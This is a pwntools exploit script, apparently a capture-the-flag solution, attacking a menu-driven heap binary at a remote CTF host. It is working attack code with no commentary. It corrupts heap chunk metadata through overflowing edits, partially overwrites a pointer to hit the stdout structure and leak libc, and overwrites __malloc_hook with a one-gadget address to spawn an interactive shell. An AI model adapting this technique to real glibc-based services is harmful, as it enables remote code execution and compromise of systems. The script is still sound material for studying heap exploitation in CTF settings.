from pwn import*
def new(index,size,content):
	p.sendlineafter('>>','1')
	p.sendlineafter('Index :',str(index))
	p.sendlineafter('size:',str(size))
	p.sendafter('Content:',content)
def edit(index,size,content):
	p.sendlineafter('>>','2')
	p.sendlineafter('Index :',str(index))
	p.sendlineafter('size:',str(size))
	p.sendafter('content:',content)
def free(index):
	p.sendlineafter('>>','3')
	p.sendlineafter('Index :',str(index))
p = process('./main')
p = remote('ha1cyon-ctf.fun',30224)
libc = ELF('./libc-2.23.so',checksec=False)
context.log_level ='DEBUG'
new(0,0x10,'FMYY') #0
new(1,0x60,'FMYY') #1
new(2,0x60,'FMYY') #2
new(3,0x10,'FMYY') #3
new(4,0x80,'FMYY') #4
new(5,0x60,'FMYY') #5
new(6,0x60,'FMYY') #6
new(7,0x60,'FMYY') #7
free(5)
free(1)
edit(0,0x21,'\x00'*0x10 + p64(0) + p64(0x71) + '\x20')
free(4)
edit(3,0x22,'\x00'*0x10 + p64(0) + p64(0x71) + '\xDD\x25')
new(1,0x60,'FMYY')
new(4,0x60,'FMYY')
new(4,0x60,'\x00'*0x33 + p64(0xFBAD1800) + p64(0)*3 + '\x88')
libc_base = u64(p.recv(6).ljust(8,'\x00')) - libc.sym['_IO_2_1_stdin_']
log.info('LIBC:\t' + hex(libc_base))
malloc_hook = libc_base + libc.sym['__malloc_hook']
rce = libc_base + 0xF1147
free(6)
free(1)
edit(0,0x21,'\x00'*0x10 + p64(0) + p64(0x71) + '\x90')
edit(7,8,p64(malloc_hook - 0x23))
new(2,0x60,'FMYY')
new(2,0x60,'FMYY')
new(2,0x60,'\x00'*0x13 + p64(rce))
p.sendlineafter('>>','1')
p.sendlineafter('Index :',str(0))
p.sendlineafter('size:',str(16))
p.interactive()

